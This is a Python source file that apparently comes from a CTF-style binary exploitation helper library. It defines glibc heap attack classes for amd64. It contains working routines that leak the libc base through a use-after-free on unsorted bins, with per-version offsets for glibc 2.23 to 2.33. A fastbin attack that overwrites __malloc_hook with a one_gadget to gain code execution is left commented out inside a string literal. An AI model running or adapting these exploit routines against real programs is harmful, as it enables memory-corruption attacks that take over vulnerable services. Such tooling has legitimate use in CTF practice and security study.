from ..connect import connect_io
from ..misc import r7f, trs, log_addr, set_libc_base_and_log, p64
from ..util import str_to_float


class HeapAttack:
    def __init__(self):
        self.cmd = None
        self.add = None
        self.delete = None
        self.edit = None
        self.show = None

        self.glibc_version = ""
        self.glibc_version_num = str_to_float(self.glibc_version)
        self.glibc = connect_io.libc

        self.exploit_way = ""

        self.one_gadgets = []

    def get_interactive_function(self, *, cmd=None, add=None, delete=None, edit=None, show=None) -> None:
        self.cmd = cmd
        self.add = add
        self.delete = delete
        self.edit = edit
        self.show = show

    def setLibcVersion(self, glibc_version: str):
        self.glibc_version = glibc_version


class Amd64HeapAttack(HeapAttack):
    def __init__(self):
        super().__init__()


class Amd64FastbinAttack(Amd64HeapAttack):
    def __init__(self):
        super().__init__()

    def uaf_to_attack_hook(self, *, idx_start: int = 0,
                           hook_name: str = "__free_hook", hook_addr: int = 0,
                           is_populate_stack: bool = False):
        ...

    """
    if self.edit is not None:
        if self.glibc_version_num == 2.23:
            self.add(idx_start + 2, 0x10, b'aaaa')
            self.add(idx_start + 3, 0x10, b'aaaa')

            self.delete(idx_start + 2)
            self.delete(idx_start + 3)
            if hook_addr == 0:
                payload = p64(connect_io.libc[hook_name] - 35)
            else:
                payload = p64(hook_addr - 35)

            self.edit(idx_start + 3, 0x10, payload)

            self.add(idx_start + 4, 0x10, b'aaaa')

            if "free" in hook_name:
                '''
                self.add(idx_start + 5, 0x10, connect_io.libc['system'])
                self.add(idx_start + 6, 0x10, b'/bin/sh\x00')
                self.delete(idx_start + 6)
                '''
                raise EOFError("Please try to attack __malloc_hook")
            elif "malloc" in hook_name:
                realloc_addr = connect_io.libc.sym['realloc']

                payload = b''
                payload += b'a' * 11
                payload += p64(trs(self.one_gadgets[0]))
                payload += p64(realloc_addr + 13)  # 4 6 8 10 12 13

                self.add(idx_start + 6, 0x60, payload)        
    """


class Amd64UnsortedBinAttack(Amd64HeapAttack):
    def __init__(self):
        super().__init__()
        self.unsorted_bin_offset = 0
        self.main_arena_offset = 0

    def uaf_to_leak_malloc_hook_addr(self, idx_start: int = 0) -> int:
        self.delete(idx_start + 0)
        self.show(idx_start + 0)

        __malloc_hook_addr = r7f() - self.unsorted_bin_offset - 0x10
        log_addr("__malloc_hook_addr", __malloc_hook_addr)

        libc_base = __malloc_hook_addr - self.glibc.sym['__malloc_hook']
        set_libc_base_and_log(libc_base)

        return libc_base

    def no_tcache_to_leak_libc_base(self, idx_start: int = 0) -> int:
        self.add(idx_start + 0, 0x90, b'aaaa')
        self.add(idx_start + 1, 0x10, b'aaaa')

        return self.uaf_to_leak_malloc_hook_addr(idx_start)

    def have_tcache_to_leak_libc_base_from_malloc_hook(self, idx_start: int = 0) -> int:
        self.add(idx_start + 0, 0x90, b'aaaa')  # unsorted bin
        for i in range(idx_start + 1, idx_start + 8):
            self.add(i, 0x90, b'aaaa')  # tcache bin

        self.add(idx_start + 8, 0x10, b'aaaa')  # interdiction top chunk

        for i in range(idx_start + 1, idx_start + 8):
            self.delete(i)

        return self.uaf_to_leak_malloc_hook_addr(idx_start)

    def uaf_to_leak_libc_base(self, idx_start: int = 0) -> int:
        if self.glibc_version_num == 2.23:
            self.unsorted_bin_offset = 96
            return self.no_tcache_to_leak_libc_base(idx_start)

        elif 2.27 <= self.glibc_version_num <= 2.33:
            self.unsorted_bin_offset = 96
            return self.have_tcache_to_leak_libc_base_from_malloc_hook(idx_start)
